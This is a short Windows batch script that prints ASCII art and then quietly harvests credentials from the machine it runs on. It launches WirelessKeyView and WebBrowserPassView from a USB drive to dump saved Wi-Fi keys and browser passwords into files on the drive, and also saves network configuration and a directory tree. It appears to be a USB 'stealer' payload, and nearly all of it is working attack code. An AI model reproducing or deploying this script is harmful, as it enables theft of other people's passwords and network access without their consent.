@echo off
color c

cls
echo "         __         "
echo "       _|  |_       "
echo "     _|      |_     "
echo "    |  _    _  |    "
echo "    | |_|  |_| |    "
echo " _  |  _    _  |  _ "
echo "|_|_|_| |__| |_|_|_|"
echo "  |_|_        _|_|  "
echo "    |_|      |_|    "

%usb%/TOOLS/WirelessKeyView_%PROCESSOR_ARCHITECTURE%.exe /stab %usb%/OUTPUT/WKV.txt
%usb%/TOOLS/WebBrowserPassView.exe /stab %usb%/OUTPUT/WBPV.txt
ipconfig > %usb%/OUTPUT/IP.txt
tree > %usb%/OUTPUT/TREE.txt

exit

